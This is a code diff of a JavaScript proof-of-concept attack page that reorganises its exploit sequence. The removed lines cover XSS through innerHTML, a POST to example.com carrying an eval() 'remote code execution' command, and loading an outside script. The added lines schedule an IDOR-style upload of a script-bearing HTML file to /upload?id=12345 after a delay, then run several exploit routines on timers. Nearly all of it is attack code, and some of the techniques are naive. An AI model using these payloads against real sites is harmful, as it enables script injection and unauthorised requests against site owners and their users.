@@ -125,39 +125,15 @@
             document.getElementById("content").style.display = "none";
 
             try {
-                // Perform the exploits
-                exploitArrayHandling();
-                exploitLargeStringConcatenation();
-                exploitComplexRegex();
-
-                // Test for XSS with DOM Manipulation
-                document.body.innerHTML = "<div id='target'>";
-                document.getElementById('target').innerHTML = "<script>alert('XSS with DOM Manipulation');</script>";
-                console.log("XSS with DOM Manipulation Test Passed");
-
-                // Test for CORS with Remote Code Execution
-                try {
-                    fetch("https://example.com/remote-exec", {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify({ command: "eval('alert(\"CORS with Remote Code Execution\");');" })
-                    });
-                } catch (error) {
-                    console.error("CORS with Remote Code Execution Test Failed", error);
-                }
-
-                // IDOR with delayed injection logic
-                console.log("Preparing for IDOR injection with delay...");
-
+                // Perform the IDOR injection first
+                console.log("Starting IDOR injection...");
                 setTimeout(() => {
                     try {
                         // Create a FormData object for the injection payload
                         let formData = new FormData();
                         formData.append("file", new Blob(["<script>alert('IDOR with delayed script injection');</script>"], { type: "text/html" }));
 
-                        // Send the request to the target endpoint after 10 seconds
+                        // Send the request to the target endpoint after 5 seconds
                         fetch("/upload?id=12345", {
                             method: "POST",
                             body: formData
@@ -173,28 +149,22 @@
                     } catch (error) {
                         console.error("Caught error during delayed IDOR injection:", error);
                     }
-                }, 10000); // 10-second delay before executing the payload
+                }, 5000); // 5-second delay before executing the payload
 
-                // Test for SRI with Script Injection
-                let scriptTag = document.createElement('script');
-                scriptTag.src = "https://example.com/script.js";
-                scriptTag.integrity = "sha384-HashValue";
-                scriptTag.onload = function() {
-                    console.log("SRI with Script Injection Test Passed");
-                };
-                document.body.appendChild(scriptTag);
+                // Perform the other PoC tests with a 2-second delay between each
+                let tests = [exploitArrayHandling, exploitLargeStringConcatenation, exploitComplexRegex, test1, test2];
+                let delay = 2000; // 2-second delay between each test
 
-                // Perform additional actions based on the target URL
-                let targetUrl = window.location.href;
-                if (targetUrl.includes("example.com")) {
-                    console.log("Attacking example.com");
-                } else {
-                    console.log("Unsupported target URL");
-                }
+                tests.forEach((test, index) => {
+                    setTimeout(() => {
+                        try {
+                            test();
+                        } catch (error) {
+                            console.error("Error during test", index + 1, ":", error);
+                        }
+                    }, delay * index);
+                });
 
-                // Perform additional tests
-                test1();
-                test2(0);
             } catch (error) {
                 console.error("Error encountered during PoC execution:", error);
             } finally {
